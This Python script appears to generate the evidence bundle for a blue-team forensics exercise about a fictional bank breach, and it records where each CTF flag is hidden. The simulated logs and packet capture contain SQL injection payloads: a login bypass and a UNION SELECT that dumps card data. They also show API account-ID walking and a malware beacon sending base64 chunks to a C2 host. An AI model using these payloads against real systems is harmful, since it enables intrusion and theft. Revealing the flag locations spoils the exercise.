"""The scripted incident behind the Week-4 bundle (stdlib only).

One coherent attack, consistent with the W1/W2 vulnerabilities, is rendered into
every artifact so the logs, the capture and the sample corroborate each other.
Flag values are injected verbatim wherever the investigation leads, so the
operator can set any RPC{...} value in the environment.

Attacker ...... 198.51.100.66  (python-requests)   -> the bank
C2 ............ updates.danubius-cdn.net / 203.0.113.200  (the sample's beacon)
Bank web ...... 10.20.0.10:80 / :5000
Timeline ...... 2026-09-01, ~14:05-14:12 UTC
"""
import base64
import calendar
import urllib.parse

try:  # works both as a package (app import) and standalone (tests, CLI)
    from .artifacts import Pcap, build_pe, clf_line, iso_time
except ImportError:  # pragma: no cover
    from artifacts import Pcap, build_pe, clf_line, iso_time

BASE = calendar.timegm((2026, 9, 1, 14, 0, 0, 0, 0, 0))

ATTACKER = "198.51.100.66"
BANK = "10.20.0.10"
C2_HOST = "updates.danubius-cdn.net"
C2_IP = "203.0.113.200"
MUTEX = "Global\\DanubiusSync-7f3a"
REGKEY = "Software\\Danubius\\Updater"
SAMPLE_NAME = "Danubius-StatementViewer-setup.exe"
UA_BOT = "python-requests/2.31.0"
UA_FF = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"
XOR_KEY = 0x5A

# where each flag ends up, for the operator README / tests
FLAG_LOCATIONS = {
    "W4-01": "auth.log - the credential-bypass AUTH SUCCESS line (token=...)",
    "W4-02": "capture.pcap - HTTP stream of the /transactions UNION dump (audit ref)",
    "W4-03": "capture.pcap - HTTP stream of GET /api/v1/accounts/3/transactions (VIP)",
    "W4-04": "%s - .rdata 'cfg=' base64(single-byte XOR) blob" % SAMPLE_NAME,
    "W4-05": "capture.pcap - the C2 beacon requests to %s (base64 d= chunks)" % C2_HOST,
}


def _q(s):
    return urllib.parse.quote(s, safe="")


# --------------------------------------------------------------------------
# access.log
# --------------------------------------------------------------------------
def build_access_log(flags):
    E = BASE
    L = []
    # background noise: normal customers
    L.append((E + 12, clf_line("10.20.30.41", E + 12, "GET", "/", 200, 3312, UA_FF)))
    L.append((E + 33, clf_line("10.20.30.41", E + 33, "POST", "/login", 302, 0, UA_FF)))
    L.append((E + 34, clf_line("10.20.30.41", E + 34, "GET", "/dashboard", 200, 4501, UA_FF)))
    L.append((E + 51, clf_line("10.20.30.77", E + 51, "GET", "/", 200, 3312, UA_FF)))
    L.append((E + 58, clf_line("10.20.30.77", E + 58, "GET",
                               "/transactions?q=Tesco", 200, 2210, UA_FF)))
    L.append((E + 120, clf_line("10.20.30.19", E + 120, "GET", "/assistant", 200, 1880, UA_FF)))
    # ---- attacker ----
    A = ATTACKER
    L.append((E + 300, clf_line(A, E + 300, "GET", "/", 200, 3312, UA_BOT)))
    L.append((E + 305, clf_line(A, E + 305, "GET", "/robots.txt", 404, 402, UA_BOT)))
    L.append((E + 310, clf_line(A, E + 310, "GET", "/login", 200, 1502, UA_BOT)))
    L.append((E + 320, clf_line(A, E + 320, "POST", "/login", 500, 617, UA_BOT)))   # admin'
    L.append((E + 325, clf_line(A, E + 325, "POST", "/login", 302, 0, UA_BOT)))     # bypass
    L.append((E + 330, clf_line(A, E + 330, "GET", "/dashboard", 200, 4520, UA_BOT)))
    L.append((E + 345, clf_line(A, E + 345, "GET",
              "/transactions?q=" + _q("' ORDER BY 5-- "), 500, 617, UA_BOT)))
    L.append((E + 350, clf_line(A, E + 350, "GET",
              "/transactions?q=" + _q("' ORDER BY 4-- "), 200, 2210, UA_BOT)))
    L.append((E + 360, clf_line(A, E + 360, "GET",
              "/transactions?q=" + _q("' UNION SELECT card_number,expiry,card_holder,status "
                                      "FROM cards-- "), 200, 5890, UA_BOT)))
    L.append((E + 400, clf_line(A, E + 400, "POST", "/api/v1/login", 200, 288, UA_BOT)))
    L.append((E + 410, clf_line(A, E + 410, "GET", "/api/v1/accounts/1/transactions", 200, 1740, UA_BOT)))
    L.append((E + 412, clf_line(A, E + 412, "GET", "/api/v1/accounts/2/transactions", 200, 1610, UA_BOT)))
    L.append((E + 415, clf_line(A, E + 415, "GET", "/api/v1/accounts/3/transactions", 200, 2980, UA_BOT)))
    # more noise after
    L.append((E + 470, clf_line("10.20.30.41", E + 470, "GET", "/transactions", 200, 2100, UA_FF)))
    L.sort(key=lambda r: r[0])
    header = ("# Danubius Bank - front-end access log (combined format)\n"
              "# host: bank-web-01   generated for incident review\n")
    return header + "\n".join(line for _, line in L) + "\n"


# --------------------------------------------------------------------------
# auth.log
# --------------------------------------------------------------------------
def build_auth_log(flags):
    E = BASE
    P = "bank-web auth[2141]:"
    lines = [
        "%s %s LOGIN SUCCESS user=m.horvat user_id=2 ip=10.20.30.41 session=sess_1a0c method=password" % (iso_time(E + 33), P),
        "%s %s LOGIN SUCCESS user=e.tomas user_id=5 ip=10.20.30.77 session=sess_2bd1 method=password" % (iso_time(E + 51), P),
        "%s %s LOGIN FAILURE user=\"admin'\" ip=%s reason=sql-syntax-error detail=unterminated-quoted-string" % (iso_time(E + 320), P, ATTACKER),
        # ---- the anomaly: success with no valid credential, right after a failure
        "%s %s AUTH SUCCESS user_id=1 ip=%s session=sess_9f83c1 method=password "
        "anomaly=credential-bypass prior_failures=1 token=%s"
        % (iso_time(E + 325), P, ATTACKER, flags["W4-01"]),
        "%s %s API TOKEN ISSUED user_id=1 ip=%s scope=full session=sess_9f83c1" % (iso_time(E + 400), P, ATTACKER),
        "%s %s LOGIN SUCCESS user=m.horvat user_id=2 ip=10.20.30.41 session=sess_3ee0 method=password" % (iso_time(E + 470), P),
    ]
    header = ("# Danubius Bank - authentication log\n"
              "# an AUTH SUCCESS with anomaly=credential-bypass is not a normal event\n")
    return header + "\n".join(lines) + "\n"


# --------------------------------------------------------------------------
# capture.pcap
# --------------------------------------------------------------------------
def _req(method, path, host, ua=UA_BOT, auth=None):
    h = "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n" % (method, path, host, ua)
    if auth:
        h += "Authorization: Bearer %s\r\n" % auth
    return (h + "Connection: close\r\n\r\n").encode()


def _resp(status, body, ctype="text/html; charset=utf-8"):
    b = body.encode() if isinstance(body, str) else body
    head = ("HTTP/1.1 %s\r\nServer: nginx\r\nContent-Type: %s\r\n"
            "Content-Length: %d\r\nConnection: close\r\n\r\n" % (status, ctype, len(b)))
    return head.encode() + b


def build_pcap(flags):
    E = BASE
    pc = Pcap()

    # legit noise
    pc.add_http(E + 12, "10.20.30.41", 51110, BANK, 80,
                _req("GET", "/", "bank.danubius.local", UA_FF),
                _resp("200 OK", "<html><title>Danubius Bank</title></html>"))

    # W4-02: the card-data exfiltration via the /transactions UNION
    union = ("/transactions?q=" +
             _q("' UNION SELECT card_number,expiry,card_holder,status FROM cards-- "))
    cards = (
        "<h2>Search results</h2><table><tr><th>Counterparty</th><th>Amount</th>"
        "<th>Note</th><th>Direction</th></tr>\n"
        "<tr><td>4917 5500 1234 0001</td><td>11/27</td><td>Maria Horvathova</td><td>active</td></tr>\n"
        "<tr><td>5218 3300 7788 4521</td><td>03/28</td><td>Jan Novak</td><td>blocked</td></tr>\n"
        "<tr><td>4024 0071 5522 9930</td><td>09/29</td><td>Peter Kovac</td><td>active</td></tr>\n"
        "<tr><td>5355 2200 4417 6650</td><td>01/27</td><td>Eva Tomasova</td><td>active</td></tr>\n"
        "<tr><td>4111 9000 3388 1207</td><td>06/28</td><td>Danubius Ops</td><td>active</td></tr>\n"
        "</table>\n"
        "<!-- pan-export-audit: 5 records exfiltrated; ref=%s -->\n" % flags["W4-02"])
    pc.add_http(E + 360, ATTACKER, 44012, BANK, 80,
                _req("GET", union, "bank.danubius.local"),
                _resp("200 OK", cards))

    # W4-03: BOLA id-walking; the VIP account (3) response carries the flag
    tok = "eyJ1IjoxfQ.sig-forged"
    for acc, port, holder, tier, bal, ref in (
            (1, 44120, "Jan Novak", "standard", "1240.55", None),
            (2, 44121, "Maria Horvathova", "standard", "83.20", None),
            (3, 44122, "Peter Kovac", "VIP", "128450.00", flags["W4-03"])):
        body = ('{"account_id":%d,"holder":"%s","tier":"%s","balance":"%s",'
                '"currency":"EUR"%s,"transactions":[]}'
                % (acc, holder, tier, bal,
                   (',"audit_ref":"%s"' % ref) if ref else ""))
        pc.add_http(E + 410 + acc, ATTACKER, port, BANK, 5000,
                    _req("GET", "/api/v1/accounts/%d/transactions" % acc,
                         "bank.danubius.local", auth=tok),
                    _resp("200 OK", body, "application/json"))

    # W4-05: the sample beacons the stolen bundle out to its C2 in base64 chunks
    blob = base64.b64encode(flags["W4-05"].encode()).decode()
    chunks = [blob[i:i + 6] for i in range(0, len(blob), 6)]
    for i, ch in enumerate(chunks):
        pc.add_http(E + 500 + i * 3, ATTACKER, 45000 + i, C2_IP, 80,
                    _req("GET", "/beacon?bid=7f3a&n=%d&d=%s" % (i, ch), C2_HOST),
                    _resp("200 OK", "ok", "text/plain"))
    return pc.bytes()


# --------------------------------------------------------------------------
# the benign sample (.exe)
# --------------------------------------------------------------------------
def build_sample(flags):
    raw = bytes(b ^ XOR_KEY for b in flags["W4-04"].encode())
    cfg = base64.b64encode(raw).decode()
    strings = [
        "Danubius Statement Viewer 2.1",
        "Setup will now install the statement viewer.",
        C2_HOST,
        "https://%s/beacon" % C2_HOST,
        MUTEX,
        REGKEY,
        "kernel32.dll", "CreateMutexA", "GetProcAddress", "LoadLibraryA",
        "winhttp.dll", "WinHttpOpen", "WinHttpConnect", "WinHttpSendRequest",
        "advapi32.dll", "RegCreateKeyExW", "RegSetValueExW",
        "campaign=DANUBE-7f3a",
        "enc=xor1;b64",              # hint: single-byte XOR then base64
        "cfg=" + cfg,                # <- the W4-04 flag, obfuscated
        "This build is a BENIGN training artifact. It performs no real actions.",
    ]
    return build_pe(strings)


# --------------------------------------------------------------------------
# players README that ships in the bundle
# --------------------------------------------------------------------------
def build_players_readme(flags):
    return """DANUBIUS BANK - INCIDENT #2026-0901  (Week 4: Investigation)
============================================================

You are the blue team. On 2026-09-01 an external host attacked the Danubius Bank
web application and exfiltrated data. You are given the evidence collected from
the perimeter. Nothing here needs to be executed - this is a forensic exercise.

EVIDENCE
  access.log     Front-end HTTP access log (combined format).
  auth.log       Authentication events from the web tier.
  capture.pcap   Full packet capture from the network tap (open in Wireshark).
  %s
                 A file recovered from a workstation. STATIC ANALYSIS ONLY -
                 do not run it. (It is a benign training artifact regardless.)

TASKS  (each answer is a flag of the form RPC{...})
  W4-01  Entry point. Identify how the attacker authenticated and recover the
         session's audit token.
  W4-02  Data breach scope. Determine what card data left the bank and recover
         the export audit reference.
  W4-03  Lateral movement. Follow the attacker into the API and recover the
         audit reference on the high-value account they reached.
  W4-04  The sample. Recover the configuration value the sample hides.
  W4-05  Command & control. Reconstruct what the sample sent to its C2.

Work the logs first, pivot into the capture, finish on the sample. Good hunting.
""" % SAMPLE_NAME
